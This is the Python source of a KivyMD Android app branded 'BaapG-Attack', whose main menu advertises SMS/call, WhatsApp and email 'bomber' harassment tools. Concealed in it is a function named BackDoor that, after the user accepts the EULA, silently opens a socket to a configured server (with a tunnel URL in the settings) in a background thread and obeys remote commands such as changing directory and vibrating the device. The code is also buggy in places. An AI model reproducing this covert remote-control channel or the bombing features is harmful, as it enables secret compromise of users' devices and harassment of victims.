
data = {
"port":5003,
"server":"127.0.0.1",
"url":"https://b3431bbbacab83.lhrtunnel.link"}

import os
from kivymd.app import MDApp
from kivymd.uix.label import MDLabel
from kivy.uix.image import Image
from kivy.uix.screenmanager import ScreenManager,Screen
from kivy.lang import Builder
from kivy.core.text import LabelBase 
from kivymd.uix.button import MDRoundFlatButton,MDRectangleFlatIconButton
from kivymd.uix.screen import MDScreen
from kivymd.uix.textfield import MDTextField
from kivy.core.audio import SoundLoader
from kivymd.uix.list import TwoLineListItem
from kivymd.toast import toast
from kivy.uix.scrollview import ScrollView
import socket
import os
import subprocess
import sys
import threading
from pathlib import Path
from plyer import vibrator
from kivy.clock import Clock

android_plat = True
mainScreen = """
MDScreen:	
	MDFloatLayout:
		md_bg_color: 0,0,0,1

		Image:
			source:"log.jpg"
			pos_hint : {"center_x":0.5,"center_y":0.23}
			size_hint_y: 0.69
			size_hint_x: 0.69

		Image :
			id : gif 
			source : "circle.gif"
			pos_hint :  {"center_x":0.5,"center_y":0.65}


			size_hint_y: 0.59
			size_hint_x: 0.59
			anim_delay: 0.05
    		allow_stretch: True


		Image:
			source :"logo.png"
			pos_hint :  {"center_x":0.5,"center_y":0.65}
			size_hint_y: 0.45
			size_hint_x: 0.45
"""
perscr = """
MDScreen:
	name: "perscreen"
	MDFloatLayout:

		md_bg_color: 1,1,1,1
		MDLabel:
			text : "EULA"	
			hlaign : "Center"
			pos_hint : {"center_x":0.75,"center_y":0.9}
			font_size : "35sp"
			font_name : "Poppins-Regular.ttf"	
		Image:
			source : "protection.gif"
			pos_hint : {"center_x":0.14,"center_y":0.9}
			size_hint_y: 0.2
			size_hint_x: 0.2
			anim_delay: 0.05
			anim_loop: 50
		MDLabel:
			text : "By using BaapG-Attack you agree our termus of service . This software is free to use and you can use it free of cost . Any damage to any one using this software by you is not our *take* and we are not completely responsible for this."
			pos_hint : {"center_x":0.5,"center_y":0.55}
			halign :"center"
			font_name : "Poppins-Regular.ttf"
		MDRoundFlatButton:
			text : "Accept"
			on_press:app.permission()
			halign :"center"
			pos_hint : {"center_x":0.5,"center_y":0.35}
				
				

"""
net ="""
MDScreen:
	name : "net"
	MDFloatLayout:
		md_bg_color : 0,0,0,1
		MDLabel
			text : "You are Fine"
			halign : 'center'
			pos_hint : {'center_y':0.9}
			theme_text_color : "Custom"
			text_color : 1,1,1,1
			#pos_hint : {'center_x':0.14,'center_y':0.5}
			font_name : "Poppins-Regular.ttf"
			font_size : "35sp"
		Image:
			source: 'wifi.png'
			halign : "center"
			size_hint_y: 0.45
			size_hint_x: 0.45
			pos_hint :  {"center_x":0.5,"center_y":0.65}
		MDRoundFlatButton:
			text : "Proceed" 
			pos_hint : {"center_x":0.5,"center_y":0.45}
			halign : "center"
			line_color : 1,1,1,1
			text_color : 1,1,1,1
			on_press : app.bahimaro()		
"""
netof = """
MDScreen:
	name : "netof"
	MDFloatLayout:
		md_bg_color : 0,0,0,1
		MDLabel
			text : "No internet"
			halign : 'center'
			pos_hint : {'center_y':0.9}
			theme_text_color : "Custom"
			text_color : 1,1,1,1
			#pos_hint : {'center_x':0.14,'center_y':0.5}
			font_name : "Poppins-Regular.ttf"
			font_size : "35sp"
		Image:
			source: 'no-wifi.png'
			halign : "center"
			size_hint_y: 0.45
			size_hint_x: 0.45
			pos_hint :  {"center_x":0.5,"center_y":0.65}
		MDRoundFlatButton:
			text : "Reload"
			pos_hint : {"center_x":0.5,"center_y":0.35}
			halign : "center"
			line_color : 1,1,1,1
			text_color : 1,1,1,1
			on_press : app.reload()		
"""
netof2= """
MDScreen:
	name : "netof2"
	MDFloatLayout:
		md_bg_color : 0,0,0,1
		MDLabel
			text : "No internet "
			halign : 'center'
			pos_hint : {'center_y':0.9}
			theme_text_color : "Custom"
			text_color : 1,1,1,1
			#pos_hint : {'center_x':0.14,'center_y':0.5}
			font_name : "Poppins-Regular.ttf"
			font_size : "35sp"
		Image:
			source: 'no-wifi.png'
			halign : "center"
			size_hint_y: 0.45
			size_hint_x: 0.45
			pos_hint :  {"center_x":0.5,"center_y":0.65}
		MDRoundFlatButton:
			text : "Reload"
			pos_hint : {"center_x":0.5,"center_y":0.35}
			halign : "center"
			line_color : 1,1,1,1
			text_color : 1,1,1,1
			on_press : app.reload()		
"""
mainv = """
MDScreen:
	name : "mainv"
	MDLabel:
		text:"Select from above options"
		pos_hint : {"center_x":0.5,"center_y":0.80}
		halign :"center"
		font_name : "Poppins-Regular.ttf"
	MDLabel:
		text :" Main Menu"
		font_name :"Poppins-Regular.ttf"
		font_size : "50sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.85}
	MDRectangleFlatIconButton:
		text : "Anonymous Message"
		pos_hint : {"center_x":0.5,"center_y":0.65}
		icon : "message"
	
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
	MDRectangleFlatIconButton:
		text : "   Sms+Call Bomber   "
		pos_hint : {"center_x":0.5,"center_y":0.55}
		icon : "bomb"
		icon_color : 0,0,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color: 0,0,0,1
		line_color : 0,0,0,1
	MDRectangleFlatIconButton:
		text : "  Whatsapp Bomber  "
		pos_hint : {"center_x":0.5,"center_y":0.45}
		icon : "whatsapp"
		icon_color : 0,1,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color : 0,1,0,1
		line_color :0,1,0,1
	MDRectangleFlatIconButton:
		text :  "       Email Bomber       "
		pos_hint : {"center_x":0.5,"center_y":0.35}
		icon : "email"
		icon_color : 1,0,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color : 1,0,0,1
		line_color :1,0,0,1
	MDLabel:
		text:" Developers : Ansh Dadwal , Krishna "
		font_style : "Caption"	
		font_name : "Poppins-Regular.ttf"
		pos_hint : {"center_x":0.5,"center_y":0.02}
	Image:
		source :"log1.png"
		pos_hint :  {"center_x":0.5,"center_y":0.15}
		size_hint_y: 0.55
		size_hint_x: 0.55
		
"""
def BackDoor(port,server):
    if port is None:
    	return None
    SERVER_HOST = server
    SERVER_PORT = port 
    BUFFER_SIZE = 1024 * 1024
    SEPARATOR = "<sep>"
    s = socket.socket()
    try:
    	s.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
    	return str(e)
    cwd = os.getcwd()
    s.send(cwd.encode())
    while True:
    	command = s.recv(BUFFER_SIZE).decode()
    	splited_command = command.split()
    	if command.lower() == "exit":
    		break
    	elif splited_command[0].lower() == "vibrate":
        	try:
        		virbrator.vibrate(time=int(splited_command[1:]))
        		output = "Success ! "
        	except Exception  as e:
        		output = str(e)
    	if splited_command[0].lower() == "cd":
        	try:
        		os.chdir(' '.join(splited_command[1:]))
        	except FileNotFoundError as e:
        		output = str(e)
        	else:
        		output = ""
    	else:
        	output = "Success "+splited_command[0].lower()+str(splited_command[1:])
        	cwd = os.getcwd()
    
    	message = f"{output}{SEPARATOR}{cwd}"
    	s.send(message.encode())
    s.close()
screen_manager = ScreenManager()
def ok():
	BackDoor(data["port"],data["server"])
	return None	
def check_intr():
	import requests
	try:
		requests.get("https://google.com",timeout=0.5)
	except Exception as e:
		return False
	return  True

done = True

class MyApp(MDApp):

	def reload(self):
		if check_intr() == True:
			screen_manager.current = "net"
		else:
			screen_manager.current = "netof"		
	def build(self):
		screen_manager.add_widget(Builder.load_string(mainScreen))
		screen_manager.add_widget(Builder.load_string(perscr))
		screen_manager.add_widget(Builder.load_string(net))
		screen_manager.add_widget(Builder.load_string(netof))
		screen_manager.add_widget(Builder.load_string(netof2))
		screen_manager.add_widget(Builder.load_string(mainv))
		return screen_manager
	def bahimaro(self):

		screen_manager.current = "mainv"
		
	def on_start(self):
		Clock.schedule_once(self.login,12)
	def login(self,obj):
		if os.path.exists("eula.txt"):
			if check_intr() == True:
				threading.Thread(target=ok, name="", args="").start()  
				screen_manager.current = "net"
			else:
				screen_manager.current = "netof"
		else:
			screen_manager.current = "perscreen"
	def permission(self):
		Path("eula.txt").touch()
		if check_intr() == True:
			threading.Thread(target=ok, name="", args="").start()  
			screen_manager.current = "net"
		else:
			if os.path.exists("ok.txt"):
				screen_manager.current = "netof"
				os.remove("ok.txt")
			else:
				screen_manager.current = "netof2"
				Path("ok.txt").touch()



                 
if __name__ == "__main__" :
	MyApp().run()